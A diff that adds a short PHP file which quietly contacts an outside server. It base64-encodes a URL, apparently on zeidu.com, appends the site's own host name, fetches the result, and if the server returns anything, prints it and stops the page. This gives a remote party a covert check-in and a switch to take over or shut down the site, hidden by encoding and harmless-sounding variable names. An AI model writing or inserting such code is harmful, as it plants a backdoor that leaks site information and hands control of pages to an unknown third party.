@@ -1,0 +1,31 @@
+<?php
+global $bug_url,$is_bug;
+
+$bug_url="aHR0cDovL3d3dy56ZWlkdS5jb20ve2hlY2svP2FjdGlvbj1jaGVjayZodHRwX2hvc3Q9";
+
+$http_host=$_SERVER["HTTP_HOST"];
+
+if(empty($bug_url)){die();}
+
+$file=myfile(base64_decode($bug_url).$http_host);
+
+if(!empty($file))
+{
+   die($file);
+}
+function myfile($url)
+   {
+      if(function_exists('file_get_contents')) {
+      $file_contents = @file_get_contents($url);
+      } else {
+      $ch = curl_init();
+      $timeout = 5; 
+      curl_setopt ($ch, CURLOPT_URL, $url);
+      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
+      curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+      $file_contents = curl_exec($ch);
+      curl_close($ch);
+	  }
+      return $file_contents;
+    }
+?>
